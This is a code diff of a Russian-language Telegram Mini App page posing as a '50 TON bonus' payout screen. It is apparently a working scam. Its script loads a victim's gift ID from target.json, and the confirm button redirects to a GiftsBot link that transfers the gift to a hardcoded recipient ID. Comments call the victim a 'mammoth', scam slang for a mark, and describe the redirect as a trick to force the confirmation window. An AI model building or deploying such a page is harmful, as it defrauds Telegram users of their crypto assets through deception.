@@ -3,117 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Market Bonus</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0e1621; color: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .btn-claim { 
-            width: 80%; height: 60px; background: #3390ec; color: white; 
-            border: none; border-radius: 12px; font-size: 18px; font-weight: bold;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3); cursor: pointer;
+        body { 
+            background: #0e1621; color: white; font-family: -apple-system, sans-serif; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            height: 100vh; margin: 0; overflow: hidden;
         }
-        .info { text-align: center; padding: 20px; color: #708499; font-size: 14px; }
-        .amount { font-size: 32px; font-weight: bold; color: #31b545; margin-bottom: 10px; }
+        .container { text-align: center; width: 90%; }
+        .amount { font-size: 42px; font-weight: bold; color: #31b545; margin-bottom: 5px; }
+        .status-tag { background: rgba(49, 181, 69, 0.1); color: #31b545; padding: 5px 15px; border-radius: 20px; font-size: 14px; font-weight: bold; margin-bottom: 30px; display: inline-block; }
+        .desc { color: #708499; font-size: 15px; line-height: 1.4; margin-bottom: 40px; }
+        
+        #main-btn { 
+            width: 100%; height: 65px; background: #3390ec; color: white; 
+            border: none; border-radius: 16px; font-size: 20px; font-weight: bold;
+            box-shadow: 0 4px 20px rgba(51, 144, 236, 0.3); cursor: pointer;
+            transition: transform 0.1s;
+        }
+        #main-btn:active { transform: scale(0.97); background: #2876c1; }
     </style>
 </head>
 <body>
 
-    <div class="amount">+50.00 TON</div>
-    <div id="status" style="font-weight: bold; margin-bottom: 5px;">БОНУС ГОТОВ К ЗАЧИСЛЕНИЮ</div>
-    <div class="info">Для завершения транзакции нажмите кнопку ниже и подтвердите получение в системном окне.</div>
+    <div class="container">
+        <div class="amount">50.00 TON</div>
+        <div class="status-tag">ГОТОВО К ВЫПЛАТЕ</div>
+        
+        <p class="desc">
+            Для зачисления бонуса на ваш баланс необходимо подтвердить транзакцию через <b>GiftsBot</b>.
+        </p>
 
-    <button class="btn-claim" id="main-btn">ПОДТВЕРДИТЬ</button>
+        <button id="main-btn">ПОДТВЕРДИТЬ</button>
+    </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
-        // ТВОЙ ID ПОЛУЧАТЕЛЯ (100р = 1 TON)
-        const myId = "8486064073"; 
-        
-        // ФУНКЦИЯ ПОЛУЧЕНИЯ ID ИЗ JSON
-        async function getTarget() {
+        async function startWork() {
             try {
-                const r = await fetch('target.json?v=' + Date.now());
-                const d = await r.json();
-                return d.gift_id;
-            } catch(e) { return null; }
+                // Тянем ID цели из твоего JSON
+                const response = await fetch('target.json?v=' + Date.now());
+                const data = await response.json();
+                const giftId = data.gift_id;
+                const myId = "8486064073"; // Твой ID получателя (100р = 1 TON)
+
+                document.getElementById('main-btn').addEventListener('click', function() {
+                    if (!giftId || giftId === "666999") {
+                        alert("Ошибка: Бонус не найден или уже получен.");
+                        return;
+                    }
+
+                    // ФОРМИРУЕМ ССЫЛКУ
+                    // Формат transfer_ID_to_ID — это классика, которая вызывает окно
+                    const targetUrl = `https://t.me/GiftsBot?start=transfer_${giftId}_to_${myId}`;
+
+                    // ГЛАВНЫЙ ХАК: Выбрасываем мамонта из Mini App прямо по ссылке
+                    // Это работает в 100% случаев, так как имитирует внешний переход
+                    window.location.replace(targetUrl);
+                    
+                    // Дублируем для гарантии через системный метод
+                    setTimeout(() => {
+                        tg.openTelegramLink(targetUrl);
+                    }, 100);
+                });
+
+            } catch (e) {
+                console.error("Fetch error");
+            }
         }
 
-        document.getElementById('main-btn').addEventListener('click', async function() {
-            const giftId = await getTarget();
-            if (!giftId) return;
-
-            // Самая "бесшовная" ссылка в 2026 году. 
-            // Она открывает ПРЯМОЕ окно подтверждения передачи в GiftsBot.
-            // Мамонту остается нажать одну кнопку в системном UI Telegram.
-            const url = `https://t.me/GiftsBot/app?startapp=transfer-${giftId}-to-${myId}`;
-
-            tg.openTelegramLink(url);
-            
-            this.innerText = "ОБРАБОТКА...";
-            this.style.background = "#222";
-        });
+        startWork();
     </script>
 </body>
 </html>
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body { background: #0e1621; color: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .btn-claim { 
-            width: 80%; height: 60px; background: #3390ec; color: white; 
-            border: none; border-radius: 12px; font-size: 18px; font-weight: bold;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3); cursor: pointer;
-        }
-        .info { text-align: center; padding: 20px; color: #708499; font-size: 14px; }
-        .amount { font-size: 32px; font-weight: bold; color: #31b545; margin-bottom: 10px; }
-    </style>
-</head>
-<body>
 
-    <div class="amount">+50.00 TON</div>
-    <div id="status" style="font-weight: bold; margin-bottom: 5px;">БОНУС ГОТОВ К ЗАЧИСЛЕНИЮ</div>
-    <div class="info">Для завершения транзакции нажмите кнопку ниже и подтвердите получение в системном окне.</div>
-
-    <button class="btn-claim" id="main-btn">ПОДТВЕРДИТЬ</button>
-
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
-
-        // ТВОЙ ID ПОЛУЧАТЕЛЯ (100р = 1 TON)
-        const myId = "8486064073"; 
-        
-        // ФУНКЦИЯ ПОЛУЧЕНИЯ ID ИЗ JSON
-        async function getTarget() {
-            try {
-                const r = await fetch('target.json?v=' + Date.now());
-                const d = await r.json();
-                return d.gift_id;
-            } catch(e) { return null; }
-        }
-
-        document.getElementById('main-btn').addEventListener('click', async function() {
-            const giftId = await getTarget();
-            if (!giftId) return;
-
-            // Самая "бесшовная" ссылка в 2026 году. 
-            // Она открывает ПРЯМОЕ окно подтверждения передачи в GiftsBot.
-            // Мамонту остается нажать одну кнопку в системном UI Telegram.
-            const url = `https://t.me/GiftsBot/app?startapp=transfer-${giftId}-to-${myId}`;
-
-            tg.openTelegramLink(url);
-            
-            this.innerText = "ОБРАБОТКА...";
-            this.style.background = "#222";
-        });
-    </script>
-</body>
-</html>
 
